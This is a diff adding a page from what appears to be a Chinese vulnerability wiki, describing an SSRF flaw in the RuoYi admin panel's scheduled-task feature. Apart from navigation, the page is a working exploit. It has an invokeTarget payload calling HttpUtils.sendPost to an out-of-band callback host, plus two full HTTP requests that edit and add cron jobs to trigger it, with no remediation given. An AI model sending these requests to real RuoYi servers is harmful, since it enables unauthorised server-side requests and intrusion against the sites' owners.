@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/RuoYi/%E8%8B%A5%E4%BE%9D%E5%90%8E%E5%8F%B0%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>若依后台定时任务存在SSRF漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u82e5\u4f9d\u540e\u53f0\u5b9a\u65f6\u4efb\u52a1\u5b58\u5728SSRF\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+          {title: "\u6570\u636e\u5305", url: "#_1", children: [
+          ]},
+          {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_2", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../RuoYi%20CMS/RuoYi%20CMS%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../RuoYi%20CMS/RuoYi%20CMS%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        RuoYi CMS 任意文件读取
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../RuoYi4.6.0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ECVE-2023-49371/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../RuoYi4.6.0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ECVE-2023-49371/" class="btn btn-xs btn-link">
+        RuoYi4.6.0 SQL注入漏洞CVE 2023 49371
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="ssrf">若依后台定时任务存在SSRF漏洞<a class="headerlink" href="#ssrf" title="Permanent link">&para;</a></h2>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>com.ruoyi.common.utils.http.HttpUtils.sendPost(&#39;ftp://6a928e83f9.ipv6.1433.eu.org&#39;,&#39;&#39;)
+</code></pre></div>
+<p><img alt="6bd379ec73798d26af505482a1863868" src="https://github.com/wy876/POC/assets/139549762/86812c61-c4ba-42da-9b39-564b19756bef" /></p>
+<p><img alt="a2f9e3adc46a688643f3688d1464005c" src="https://github.com/wy876/POC/assets/139549762/ea2b8763-2303-4f6b-aa55-7b86a5a2f071" /></p>
+<h2 id="_1">数据包<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>POST /monitor/job/edit HTTP/1.1
+Host: xxx
+Connection: keep-alive
+Content-Length: 242
+sec-ch-ua: &quot;Chromium&quot;;v=&quot;124&quot;, &quot;Google Chrome&quot;;v=&quot;124&quot;, &quot;Not-A.Brand&quot;;v=&quot;99&quot;
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Cookie: JSESSIONID=563ce678-53de-407f-8ed9-cabbc1f17ea4
+
+jobId=102&amp;updateBy=admin&amp;jobName=test&amp;jobGroup=DEFAULT&amp;invokeTarget=com.ruoyi.common.utils.http.HttpUtils.sendPost(&#39;ftp%3A%2F%2F6a928e83f9.ipv6.1433.eu.org&#39;%2C&#39;&#39;)&amp;cronExpression=0%2F10+*+*+*+*+%3F&amp;misfirePolicy=1&amp;concurrent=1&amp;status=1&amp;remark=
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>POST /monitor/job/add HTTP/1.1
+Host: xxxx
+Connection: keep-alive
+Content-Length: 232
+sec-ch-ua: &quot;Chromium&quot;;v=&quot;124&quot;, &quot;Google Chrome&quot;;v=&quot;124&quot;, &quot;Not-A.Brand&quot;;v=&quot;99&quot;
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Cookie: JSESSIONID=563ce678-53de-407f-8ed9-cabbc1f17ea4
+
+createBy=admin&amp;jobName=test1&amp;jobGroup=DEFAULT&amp;invokeTarget=com.ruoyi.common.utils.http.HttpUtils.sendPost(&#39;ftp%3A%2F%2F6a928e83f9.ipv6.1433.eu.org&#39;%2C&#39;&#39;)&amp;cronExpression=0%2F1+*+*+*+*+%3F&amp;misfirePolicy=1&amp;concurrent=1&amp;status=0&amp;remark=
+</code></pre></div>
+<h2 id="_2">漏洞来源<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/ttn46zznE4-op2GydL1i1A">https://mp.weixin.qq.com/s/ttn46zznE4-op2GydL1i1A</a></li>
+</ul>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../RuoYi%20CMS/RuoYi%20CMS%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../RuoYi%20CMS/RuoYi%20CMS%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        RuoYi CMS 任意文件读取
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../RuoYi4.6.0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ECVE-2023-49371/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../RuoYi4.6.0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ECVE-2023-49371/" class="btn btn-xs btn-link">
+        RuoYi4.6.0 SQL注入漏洞CVE 2023 49371
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
